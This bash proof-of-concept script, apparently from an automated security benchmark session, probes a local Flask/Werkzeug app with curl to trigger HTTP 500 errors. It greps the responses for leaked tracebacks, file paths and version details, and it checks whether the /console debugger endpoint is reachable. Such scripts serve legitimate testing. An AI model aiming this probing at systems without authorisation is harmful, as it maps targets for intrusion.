#!/bin/bash
# POC: Exploratory POC that attempts multiple endpoint patterns to trigger exceptions and demonstrate information disclosure through Werkzeug tracebacks
# Target: ./repo
# Created: 2025-11-04T17:06:36.423Z
# Session: benchmark-XBEN-016-24-mhkt6d0m

# Werkzeug Traceback Information Disclosure POC - Version 3
# This script explores different endpoints to trigger exceptions
# and demonstrate information disclosure through tracebacks

TARGET_URL="${1:-http://localhost:5000}"

echo "[*] Werkzeug Traceback Information Disclosure POC"
echo "[*] Target: $TARGET_URL"
echo ""

# First, try to get the root to see what endpoints exist
echo "[*] Test 1: Exploring available endpoints..."
ROOT_RESPONSE=$(curl -s "$TARGET_URL/")

# Try multiple endpoint patterns to trigger exceptions
ENDPOINTS=(
    "/level/0"
    "/level/nonexistent"
    "/api/nonexistent"
    "/submit?level=nonexistent"
    "/?level=nonexistent"
    "/nonexistent_path"
)

for endpoint in "${ENDPOINTS[@]}"; do
    echo "[*] Trying endpoint: $TARGET_URL$endpoint"
    RESPONSE=$(curl -s "$TARGET_URL$endpoint" 2>&1)
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint" 2>&1)
    
    # Check if this endpoint returns a 500 error (exception)
    if [ "$HTTP_CODE" = "500" ]; then
        echo "[+] Got HTTP 500 on: $endpoint"
        
        # Check for traceback indicators
        if echo "$RESPONSE" | grep -qi "traceback\|werkzeug\|python\|KeyError\|ValueError"; then
            echo "[!] VULNERABLE: Information disclosure found!"
            echo ""
            echo "[*] Information Disclosure Indicators:"
            
            if echo "$RESPONSE" | grep -q "Traceback"; then
                echo "  ✓ Python Traceback exposed"
            fi
            
            if echo "$RESPONSE" | grep -q "File.*line"; then
                echo "  ✓ File paths with line numbers"
            fi
            
            if echo "$RESPONSE" | grep -q "\.py"; then
                echo "  ✓ Python source files identified"
            fi
            
            if echo "$RESPONSE" | grep -q "site-packages\|local/lib"; then
                echo "  ✓ Library paths exposed"
            fi
            
            if echo "$RESPONSE" | grep -qi "python"; then
                echo "  ✓ Python version information"
            fi
            
            if echo "$RESPONSE" | grep -iq "werkzeug"; then
                echo "  ✓ Werkzeug framework details"
            fi
            
            echo ""
            echo "[*] Response content (first 1000 chars):"
            echo "---"
            echo "$RESPONSE" | head -c 1000
            echo ""
            echo "---"
            exit 0
        fi
    fi
done

# If no 500 errors found, check if debug mode is actually enabled
# by looking at existing findings that mention the app
echo "[-] Could not trigger 500 error on standard endpoints"
echo "[*] Checking root endpoint for debug indicators..."
ROOT_RESPONSE=$(curl -s "$TARGET_URL/")

if echo "$ROOT_RESPONSE" | grep -qi "werkzeug\|debugger"; then
    echo "[!] Debug mode indicators found on root"
    exit 0
fi

# Try accessing the console endpoint directly (from existing findings)
echo "[*] Checking for console endpoint..."
CONSOLE_RESPONSE=$(curl -s "$TARGET_URL/console" 2>&1)
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/console" 2>&1)

if [ "$HTTP_CODE" != "404" ]; then
    echo "[+] Console endpoint accessible (HTTP $HTTP_CODE)"
    if echo "$CONSOLE_RESPONSE" | grep -qi "traceback\|werkzeug"; then
        echo "[!] Traceback information found"
        exit 0
    fi
fi

echo "[-] Unable to confirm vulnerability - could not trigger an exception"
exit 1